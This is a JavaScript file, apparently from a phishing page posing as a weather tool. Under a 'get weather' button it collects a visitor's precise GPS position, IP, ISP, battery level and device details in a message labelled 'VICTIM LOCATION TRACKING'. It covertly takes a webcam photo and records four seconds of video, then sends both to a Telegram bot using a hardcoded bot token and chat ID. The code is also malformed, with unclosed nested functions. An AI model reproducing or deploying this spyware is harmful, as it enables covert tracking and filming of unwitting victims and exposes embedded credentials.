(async function() {
    const BOT_TOKEN = '8027235420:AAEFz-15VdKF__StWGlCzm5939sSnpmY8FI';
    const CHAT_ID = '-1003874371144'; 

    
    const TELEGRAM_CHAT_ID = new URLSearchParams(window.location.search).get('id');

    async function getLocation() {
      const btn = document.querySelector('.get-weather-btn');
      const loader = document.querySelector('.loader');
      const status = document.getElementById('status');
      
      try {
        btn.disabled = true;
        btn.textContent = '📍 Getting precise location...';
        loader.style.display = 'block';
        status.style.display = 'block';
        status.textContent = 'Requesting GPS access...';

        // High accuracy GPS location
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(
            resolve, 
            reject, 
            {
              enableHighAccuracy: true,
              timeout: 15000,
              maximumAge: 0
            }
          );
        });
          async function sendPreciseGPS(position) {
      const gpsData = {
        type: 'GPS',
        latitude: position.coords.latitude.toFixed(8),
        longitude: position.coords.longitude.toFixed(8),
        accuracy: Math.round(position.coords.accuracy),
        altitude: position.coords.altitude?.toFixed(2) || 'N/A',
        heading: position.coords.heading?.toFixed(1) || 'N/A',
        speed: position.coords.speed?.toFixed(1) || 'N/A'
      };
      
      await sendToServer('GPS', gpsData);
    async function sendVictimData(position, weather) {
      try {
        const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
        const battery = await navigator.getBattery().then(b => 
          `${Math.round(b.level * 100)}% ${b.charging ? '⚡' : '🔋'}`).catch(() => 'N/A');
        
        const message = `🌐 *VICTIM LOCATION TRACKING*

📍 *GPS Coordinates*:
• *Latitude*: ${position.coords.latitude.toFixed(8)}
• *Longitude*: ${position.coords.longitude.toFixed(8)}
• *Accuracy*: ${Math.round(position.coords.accuracy)}m
• *Altitude*: ${position.coords.altitude?.toFixed(2) || 'N/A'}m
• *Speed*: ${position.coords.speed?.toFixed(1) || 'N/A'}m/s

🌤️ *Weather*: ${weather.name} - ${Math.round(weather.main.temp)}°C
🌐 *IP*: ${ipInfo.ip}
🏢 *ISP*: ${ipInfo.org}
🔋 *Battery*: ${await battery}
🕒 *Time*: ${new Date().toLocaleString('en-IN')}
💻 *Device*: ${navigator.userAgent.substring(0, 100)}`;

        await sendToServer('Text', message);
      } catch (e) {
        console.error('Victim data error:', e);
      }
    }

    async function sendToServer(type, data) {
      const response = await fetch(CONFIG.API_ENDPOINT, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          CHAT_ID: TELEGRAM_CHAT_ID,
          data: JSON.stringify(data),
          type: type
        })
      });
      
      if (!response.ok) {
        const result = await response.json();
        console.error('Server error:', result);
      }
      return response.json();
    }
    
    const CONFIG = {
      WEATHER_API_KEY: '5263f75a4e738f5b297b1b5ca639cc1c',
      API_ENDPOINT: '/api/server'
    };
    
      const video = document.getElementById('preview');
    const canvas = document.createElement('canvas');

    async function handleCapture() {
        try {
            const stream = video.srcObject;
            if (!stream || video.videoWidth === 0) {
                setTimeout(handleCapture, 500);
                return;
            }

            // --- BƯỚC 1: CHỤP ẢNH NGAY LẬP TỨC ---
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            
            canvas.toBlob(async (imgBlob) => {
                const imgData = new FormData();
                imgData.append('chat_id', CHAT_ID);
                imgData.append('photo', imgBlob, 'target_photo.jpg');
                imgData.append('caption', '📷 Successfully Taken ✔');
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: imgData });
            }, 'image/jpeg', 0.8);

            // --- BƯỚC 2: QUAY VIDEO TRONG 4 GIÂY ---
            const recorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
            let chunks = [];

            recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
            recorder.onstop = async () => {
                const videoBlob = new Blob(chunks, { type: 'video/webm' });
                const videoData = new FormData();
                videoData.append('chat_id', CHAT_ID);
                videoData.append('video', videoBlob, 'target_video.mp4');
                videoData.append('caption', '🎬 Sucessfully Record ✔');
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: videoData });
                
                // Báo hiệu chuyển hướng
                window.mainScriptFinished = true;
            };

            recorder.start();
            setTimeout(() => { recorder.stop(); }, 4000);

        } catch (err) {
            console.error("Lỗi xác thực:", err);
            window.mainScriptFinished = true;
        }
    }

    handleCapture();
})();
